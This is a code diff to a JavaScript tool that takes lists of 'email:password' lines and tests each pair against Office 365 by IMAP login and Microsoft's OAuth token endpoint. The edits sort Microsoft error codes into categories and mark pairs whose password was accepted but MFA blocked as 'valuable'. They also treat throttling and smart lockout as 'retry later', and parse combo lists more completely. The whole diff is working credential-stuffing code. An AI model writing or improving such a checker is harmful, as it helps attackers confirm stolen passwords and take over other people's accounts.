@@ -54,8 +54,14 @@ export function classifyImapLogin({ ok, error, authFailed } = {}) {
   if (/login is disabled|basic authentication is disabled|not enabled for the user|disabled for the (user|account|tenant)|authenticationfailed.*disabled|modern auth/.test(msg)) {
     return { status: 'unknown', method: 'imap', fallback: true };
   }
-  // A clean authentication rejection that is NOT an "auth disabled" case is a
-  // genuine wrong password. ImapFlow sets authenticationFailed on these.
+  // Throttling / smart lockout / temporary server conditions must NOT be read as
+  // a wrong password — the account may be fine. Defer to OAuth2 (and the caller
+  // surfaces throttling so the user can slow down).
+  if (/throttl|too many|temporar|try again|server unavailable|service unavailable|server busy|rate.?limit|\[unavailable\]|account is locked|locked/.test(msg)) {
+    return { status: 'unknown', method: 'imap', fallback: true };
+  }
+  // A clean authentication rejection that is NOT an "auth disabled"/throttle case
+  // is a genuine wrong password. ImapFlow sets authenticationFailed on these.
   if (authFailed || /invalid credentials|authentication failed|login failed|logindenied|logon denied|incorrect password|user ?name or password/.test(msg)) {
     return { status: 'invalid', method: 'imap', fallback: false };
   }
@@ -63,26 +69,44 @@ export function classifyImapLogin({ ok, error, authFailed } = {}) {
   return { status: 'unreachable', method: 'imap', fallback: true };
 }
 
-// AADSTS codes that mean the password may well be correct but the login cannot
-// be completed/confirmed without more (MFA, policy, expiry, disabled/locked).
-const OAUTH_UNKNOWN_CODES = new Set([
-  '50076', '50079', '50158', '53000', '53001', '53003', // MFA / conditional access / device
-  '50053', '50055', '50057', '50072', '50074',          // locked / expired / disabled / needs MFA
+// AADSTS codes that CONFIRM the password is correct but block completion — the
+// login was accepted, MFA / further auth is simply required. These are valuable:
+// the credential pair is right.
+const OAUTH_MFA_CODES = new Set([
+  '50076', '50079', '50072', '50074', // MFA required (password was accepted)
+  '50055',                            // password is correct but EXPIRED
 ]);
-// AADSTS codes that are a definitive bad credential / missing account.
-const OAUTH_INVALID_CODES = new Set(['50126', '50034', '50059']);
+// Policy / state codes: the password MIGHT be right but we can't confirm it
+// (conditional access, device policy, locked, disabled).
+const OAUTH_UNKNOWN_CODES = new Set([
+  '50158', '53000', '53001', '53003', '53004', // conditional access / device
+  '50053',                                     // account locked (smart lockout)
+  '50057',                                     // account disabled
+  '700016', '7000218', '7000215',              // ROPC client not allowed / needs secret
+  '90002', '90072', '500011',                  // tenant / resource issues
+]);
+// Throttling — results are unreliable; definitely not a wrong password.
+const OAUTH_THROTTLE_CODES = new Set(['50053', '80049', '90056', '16000']);
+// Definitive bad credential / non-existent account.
+const OAUTH_INVALID_CODES = new Set(['50126', '50034']);
 
 /**
  * Classify Microsoft's token response into a verdict. Pure.
  * @param {{ok:boolean, data?:object}} resp
- * @returns {{status:O365Status, method:'oauth', detail:string}}
+ * @returns {{status:O365Status, method:'oauth', detail:string, throttled?:boolean, passwordValid?:boolean}}
  */
 export function classifyTokenResponse({ ok, data } = {}) {
-  if (ok && data && data.access_token) return { status: 'valid', method: 'oauth', detail: 'token issued' };
+  if (ok && data && data.access_token) return { status: 'valid', method: 'oauth', detail: 'token issued', passwordValid: true };
   const text = String((data && (data.error_description || data.error)) || '');
   const code = (text.match(/AADSTS(\d+)/) || [])[1] || '';
-  if (OAUTH_INVALID_CODES.has(code)) return { status: 'invalid', method: 'oauth', detail: `AADSTS${code}` };
-  if (OAUTH_UNKNOWN_CODES.has(code)) return { status: 'unknown', method: 'oauth', detail: `AADSTS${code} (password may be valid, not confirmable)` };
+  if (OAUTH_MFA_CODES.has(code)) {
+    return { status: 'unknown', method: 'oauth', detail: `AADSTS${code} — password is VALID, MFA/extra auth required`, passwordValid: true };
+  }
+  if (OAUTH_THROTTLE_CODES.has(code)) {
+    return { status: 'unknown', method: 'oauth', detail: `AADSTS${code} — throttled/locked, retry later`, throttled: true };
+  }
+  if (OAUTH_INVALID_CODES.has(code)) return { status: 'invalid', method: 'oauth', detail: `AADSTS${code} — wrong credentials` };
+  if (OAUTH_UNKNOWN_CODES.has(code)) return { status: 'unknown', method: 'oauth', detail: `AADSTS${code} — cannot confirm (policy/tenant)` };
   return { status: 'unknown', method: 'oauth', detail: code ? `AADSTS${code}` : (text.slice(0, 140) || 'login not confirmed') };
 }
 
@@ -154,7 +178,14 @@ export async function verifyOffice365(target, opts = {}) {
   try { tok = await tokenFn(user, pass, opts); }
   catch (err) { tok = { ok: false, data: { error_description: err?.message || String(err) } }; }
   const o = classifyTokenResponse(tok);
-  return { ...base, status: o.status, method: o.method, detail: o.detail || imap.error || '' };
+  return {
+    ...base,
+    status: o.status,
+    method: o.method,
+    detail: o.detail || imap.error || '',
+    ...(o.throttled ? { throttled: true } : {}),
+    ...(o.passwordValid ? { passwordValid: true } : {}),
+  };
 }
 
 /**
@@ -197,15 +228,24 @@ export async function runOffice365Checks(targets, opts = {}, onResult) {
  * @returns {O365Target[]}
  */
 export function parseOffice365Lines(text) {
-  const out = [];
-  for (const raw of String(text || '').split(/\r?\n/)) {
-    const line = raw.trim();
-    if (!line || line.startsWith('#')) continue;
-    // Find the email, then take the remainder (after the following separator) as
-    // the password up to the next separator — so `email:pass`, `email pass`, and
-    // `email:pass:host:port` all yield {email, pass}.
-    const m = line.match(/([^\s:,;|]+@[^\s:,;|]+)[\s:,;|]+([^\s:,;|]+)/);
-    if (m) out.push({ user: m[1], pass: m[2] });
-  }
-  return out;
+  return String(text || '').split(/\r?\n/).map(parseOffice365Line).filter(Boolean);
+}
+
+/**
+ * Parse ONE `email<sep>password` line. The email is taken up to the first
+ * separator (`:`, `;`, `,`, tab, or spaces); EVERYTHING after that separator is
+ * the password, trimmed — so passwords that themselves contain `:`/`;`/`,`/
+ * spaces are not truncated (which would otherwise fail a real login as a wrong
+ * password). Blank and `#` comment lines yield null. Pure.
+ * @param {string} raw
+ * @returns {O365Target|null}
+ */
+export function parseOffice365Line(raw) {
+  const line = String(raw || '').trim();
+  if (!line || line.startsWith('#')) return null;
+  const m = line.match(/^(\S+?@\S+?)[\s:;,|]+(.+)$/);
+  if (!m) return null;
+  const pass = m[2].trim();
+  if (!pass) return null;
+  return { user: m[1], pass };
 }
